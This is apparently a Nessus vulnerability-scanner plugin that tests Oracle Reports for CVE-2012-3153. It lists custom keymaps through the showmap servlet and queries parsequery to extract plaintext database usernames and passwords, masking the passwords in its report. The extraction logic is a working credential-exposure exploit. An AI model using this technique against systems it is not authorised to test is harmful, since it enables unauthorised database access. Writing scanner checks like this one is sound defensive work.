#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(73120);
  script_version("$Revision: 1.4 $");
  script_cvs_date("$Date: 2016/05/20 14:21:44 $");

  script_cve_id("CVE-2012-3153");
  script_bugtraq_id(55961);
  script_osvdb_id(86394);
  script_xref(name:"EDB-ID", value:"31253");

  script_name(english:"Oracle Reports Servlet Parsequery Function Remote Database Credentials Exposure");
  script_summary(english:"Tries to exploit remote database credential exposure vulnerability");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote host is running a web application that exposes database
credentials."
  );
  script_set_attribute(
    attribute:"description",
    value:
"Nessus was able to exploit a flaw in the Oracle Reports servlet
parsequery function, and was able to retrieve the plaintext database
credentials for one or more users. A remote attacker can exploit this
vulnerability to gain unauthorized database access."
  );
  # http://blog.netinfiltration.com/2013/11/03/oracle-reports-cve-2012-3152-and-cve-2012-3153/
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?c969a07f");
  # http://www.oracle.com/technetwork/topics/security/cpuoct2012-1515893.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?1cef09be");
  script_set_attribute(attribute:"solution", value:"Apply the appropriate patch per the vendor's advisory.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'Oracle Forms and Reports Remote Code Execution');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2012/10/16");
  script_set_attribute(attribute:"patch_publication_date", value:"2012/10/16");
  script_set_attribute(attribute:"plugin_publication_date", value:"2014/03/20");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:oracle:fusion_middleware");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2014-2016 Tenable Network Security, Inc.");

  script_dependencies("oracle_reports_detect.nbin");
  script_require_keys("www/oracle_reports");
  script_require_ports("Services/www", 8888);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

appname = "Oracle Reports";

port = get_http_port(default:8888);

install = get_install_from_kb(
  appname:'oracle_reports',
  port:port,
  exit_on_fail:TRUE
);

# try and obtain a list of keymaps
show_keymaps_uri = install['dir'] + '/rwservlet/showmap';

res = http_send_recv3(method:"GET",
                      item:show_keymaps_uri,
                      port:port,
                      exit_on_fail:TRUE);


if ("Reports Servlet Key Map" >!< res[2]) exit(0, "Unable to access Oracle Reports showmap function via "+build_url(port:port, qs:show_keymaps_uri)+".");

lines = split(res[2], sep:'\n', keep:FALSE);

count = 0;

custom_keymaps = make_list();

ignorable_keymaps = make_list(
  '%ENV_NAME%',
  'barcodepaper',
  'barcodeweb',
  'breakbparam',
  'charthyperlink_ias',
  'charthyperlink_ids',
  'distributionpaper',
  'express',
  'orqa',
  'parmformjsp',
  'pdfenhancements',
  'report_defaultid',
  'report_secure',
  'run',
  'runp',
  'tutorial',
  'xmldata'
);

# get a list of non-default custom keymaps
foreach line (lines)
{
  if ("OraInstructionText" >!< line) continue;

  # table contains name the value, we want to skip over the values
  count++;
  if (!(count%2)) continue;

  item = eregmatch(pattern:"OraInstructionText>([^<]+)<", string:line);
  if (!isnull(item) && !isnull(item[1]))
  {
    keymap = chomp(item[1]);

    ignore = FALSE;
    foreach map (ignorable_keymaps)
      if (map == keymap) ignore = TRUE;
    if (!ignore)
      custom_keymaps = make_list(custom_keymaps, keymap);
  }
}

if (max_index(custom_keymaps) == 0) exit(0, "Failed to access Oracle Reports showmap function at "+build_url(port:port, qs:show_keymaps_uri)+".");

report = '';

parsequery_uri = install['dir'] + '/rwservlet/parsequery?';

foreach map (custom_keymaps)
{
  res = http_send_recv3(method:"GET",
                        item:parsequery_uri + map,
                        port:port,
                        exit_on_fail:TRUE);

  item = eregmatch(pattern:"userid=([^/]+)/([^@]+)@([^ \t]+)([ \t]|$)",
                   string:res[2]);
  if (!isnull(item) && !isnull(item[1]) && !isnull(item[2]) && !isnull(item[3]))
  {
    pass = chomp(item[2]);

    # mask actual password except for first and last characters.
    if (strlen(pass) < 2) pass = crap(data:'*', length:6);
    else pass = strcat(pass[0], crap(data:'*', length:6), pass[strlen(pass)-1]);

    report += '\n  Username : ' + chomp(item[1]) +
              '\n  Password : ' + pass +
              '\n  Database : ' + chomp(item[3]) + '\n';
  }
}

if (report != '')
{
  report = '\nNessus was able to enumerate the following logins : \n' + report;
  if (report_verbosity > 0) security_warning(port:port, extra:report);
  else security_warning(port);
}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, "Oracle Reports", build_url(port:port, qs:install['dir'] + '/rwservlet'));
